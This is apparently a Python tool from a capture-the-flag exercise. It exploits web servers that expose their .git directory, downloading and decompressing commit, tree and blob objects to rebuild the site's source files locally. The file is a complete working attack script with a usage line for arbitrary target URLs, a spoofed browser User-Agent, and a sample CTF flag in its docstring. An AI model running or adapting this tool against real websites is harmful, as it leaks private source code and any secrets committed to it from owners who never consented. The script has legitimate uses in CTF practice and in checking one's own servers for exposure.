"""
Author: Haozhe Zhang

Each commit has a folder.
  Commit_hash
  \_ commit info_hash
  \_ file_1 extracted from blob_1
  \_ file_2 extracted from blob_2

data example. for development only.
commit:
    b'commit 210\x00tree 4b825dc642cb6eb9a060e54bf8d69288fbee4904
    parent 912133f7bd228e96757a531ef52d1777de10ca8a
    author Alice <xxx@qq.com> 1554748133 +0800
    committer Alice <xxx@qq.com> 1554748133 +0800

    delete flag'

tree:
    b'tree 0\x00'

    b"tree 32\x00100644 flag\x00'0\xedavmI\x048\xad\x80\xe0\x7f\xec\x85|\x83\xfbB\xb3"

blob:
    b'blob 37\x00WHUCTF{Y0u_Kn0w_G1t_And_Y0u_F1nd_Me}\n'
"""

import binascii
import http.client
import os
import re
import sys
import urllib.parse
import urllib.request
import zlib


class GitHacker:
    def __init__(self, url: str):
        self.base_url = url
        self.workpath = urllib.parse.urlparse(url).netloc.replace(':', '_')

    def _request(self, url: str) -> http.client.HTTPResponse:
        """
        Make request with certain headers.
        :param url: str
        :return: http.client.HTTPResponse
        """
        self.request = urllib.request.Request(
            url,
            headers={'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
        try:
            return urllib.request.urlopen(self.request, timeout=10)
        except Exception as e:
            print(e, url)
            exit(-1)

    def get_head_hash(self):
        """
        Get HEAD commit hash.
        :return:
        """
        print('[*] Start to fetch HEAD hash')

        # Retrieve HEAD hash.
        ref_url = '{base_url}HEAD'.format(base_url=self.base_url)
        head_file = self._request(ref_url).read().strip().decode().split(': ')[1]
        head_url = '{base_url}{head_file}'.format(base_url=self.base_url, head_file=head_file)
        head_hash = self._request(head_url).read().strip().decode()

        print('[+] Starting at commit {}'.format(head_hash[-6:]))
        if not os.path.exists(self.workpath):
            os.mkdir(self.workpath)
        return head_hash

    def analyze_object(self, current_hash, commit_hash=None, tree_hash=None, file_name=None):
        """
        When a hash is given, request for the relevant object, decode it and parse it.
        If it is a commit, retrieve the tree and the parent node hashes, and call the
        method to analyze the tree and the parent nodes.
        If it is a tree, retrieve the blob hashes, download the relevant object and
        decode it and save it into the related folder.
        :param current_hash:
        :param commit_hash:
        :param file_name:
        :return:
        """
        # request
        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=current_hash[:2], fi=current_hash[2:])
        data = self._request(url).read()
        data = zlib.decompress(data)

        # commit
        if data[:6] == b'commit':
            print('[+] Analyze {} '.format(current_hash[-6:]))

            # create commit folder and save commit message.
            commit_hash = current_hash
            commit_folder: str = '{workpath}/commit_{hash_str}'.format(workpath=self.workpath, hash_str=current_hash[-6:])
            if not os.path.exists(commit_folder):
                os.mkdir(commit_folder)
            with open('{folder}/commit_info_{hash_str}.txt'.format(folder=commit_folder, hash_str=current_hash[-6:]),
                      'w') as fp:
                fp.write(data.decode())

            # find tree and its parent
            # read commit - tree
            if data.find(b'tree') != -1:
                tree_hash_idx = data.find(b'tree') + 5
                tree_hash_str = data[tree_hash_idx: tree_hash_idx + 40].decode()
                self.analyze_object(current_hash=tree_hash_str, tree_hash=tree_hash_str, commit_hash=commit_hash)

            # read commit - parent (another commit. recursion here.)
            if data.find(b'parent') != -1:
                parent_hash_idx = data.find(b'parent') + 7
                parent_hash_str = data[parent_hash_idx: parent_hash_idx + 40].decode()
                self.analyze_object(current_hash=parent_hash_str)

        elif data[:4] == b'tree':
            print('[+] Analyze {} -> {}'.format(commit_hash[-6:], tree_hash[-6:]))

            # parse tree object and retrieve file names + file hashes
            split_tree = data.split('100644 '.encode())

            # for each file object, analyze it.
            for i in range(1, len(split_tree)):
                pivot_idx = split_tree[i].find(b'\x00')
                f_name = split_tree[i][:pivot_idx]
                hash_str = split_tree[i][pivot_idx+1:]
                f_name = f_name.decode()
                hash_str = binascii.b2a_hex(hash_str).decode()

                self.analyze_object(current_hash=hash_str, commit_hash=commit_hash, tree_hash=current_hash, file_name=f_name)

        elif data[:4] == b'blob':
            print('[+] Analyze {} -> {} -> {}'.format(commit_hash[-6:], tree_hash[-6:], current_hash[-6:]))

            # specify the file path and write data to the new file.
            commit_folder: str = '{workpath}/commit_{hash_str}'.format(workpath=self.workpath, hash_str=commit_hash[-6:])
            data = re.sub(r'blob \d+\00', '', data.decode())
            with open('{folder}/{file}'.format(folder=commit_folder, file=file_name), 'wb') as fp:
                fp.write(data.encode())

        else:
            print('[!] Unknown object found with hash {}'.format(current_hash))

    def run(self):
        commit_hash = self.get_head_hash()
        self.analyze_object(current_hash=commit_hash)
        print('[*] Finished. Please check the folder {}'.format(self.workpath))


def main():
    if len(sys.argv) == 1:
        print('[Usage] python3 githack.py http://target.com/.git/')
        exit(0)

    url = sys.argv[1]
    hacker = GitHacker(url)
    hacker.run()


def test():
    url = 'http://192.168.64.2/GitHack/.git/'
    hacker = GitHacker(url)
    hacker.run()


if __name__ == '__main__':
    main()
